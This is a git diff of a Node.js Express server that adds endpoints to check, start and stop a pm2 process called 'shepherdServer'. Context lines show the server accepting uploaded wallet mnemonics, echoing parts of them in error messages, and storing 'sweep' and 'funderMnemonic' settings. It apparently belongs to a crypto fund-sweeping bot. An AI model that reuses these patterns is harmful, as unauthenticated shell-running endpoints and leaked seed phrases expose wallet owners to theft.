@@ -88,7 +88,7 @@ app.post('/api/passphrases/upload', async(req, res) => {
         res.status(500).json({success: false, error: `Failed to save passphrase: ${mnemonic.slice(0,15)}....${mnemonic.slice(-15)}` });
     }
 })
-
+// Bot Status
 app.post("/api/main/bot/status", (req, res) => {
     exec("pm2 show api3000", (err, stdout, stderr) => {
         if (err) return res.status(500).json({ success: false, error: stderr });
@@ -105,6 +105,15 @@ app.post("/api/bot/status", (req, res) => {
     });
 });
 
+app.post("/api/bot/shep/status", (req, res) => {
+    exec("pm2 show shepherdServer", (err, stdout, stderr) => {
+        if (err) return res.status(500).json({ success: false, error: stderr });
+        const isOnline = stdout.includes("status online");
+        res.json({ success: true, status: stdout, online: isOnline });
+    });
+});
+
+// Start Bot
 app.post("/api/main/bot/start", (req, res) => {
     exec("pm2 restart api3000 || pm2 start server.js --name api3000", (err, stdout, stderr) => {
         if (err) {
@@ -122,6 +131,17 @@ app.post("/api/bot/start", (req, res) => {
         res.json({ success: true, message: "Bot started", output: stdout });
     });
 });
+
+app.post("/api/bot/shep/start", (req, res) => {
+    exec("pm2 restart shepherdServer || pm2 start shepherdServer.js --name shepherdServer", (err, stdout, stderr) => {
+        if (err) {
+            return res.status(500).json({ success: false, error: stderr });
+        }
+        res.json({ success: true, message: "Bot started", output: stdout });
+    });
+});
+
+// Stop Bot
 
 app.post("/api/main/bot/stop", (req, res) => {
     exec("pm2 stop api3000", (err, stdout, stderr) => {
@@ -141,6 +161,18 @@ app.post("/api/bot/stop", (req, res) => {
         res.json({ success: true, message: "Bot stopped", output: stdout });
     });
 });
+
+app.post("/api/bot/shep/stop", (req, res) => {
+    exec("pm2 stop shepherdServer", (err, stdout, stderr) => {
+        if (err) {
+            return res.status(500).json({ success: false, error: stderr });
+        }
+        exec("pm2 delete shepherdServer");
+        res.json({ success: true, message: "Bot stopped", output: stdout });
+    });
+});
+
+// ///////////////////
 
 app.post('/api/settings', async(req, res) => {
     const { maxFlood, activeSponsors, name, fee, sweep, funderMnemonic, botAddress, minSponsorBalance } = req.body;
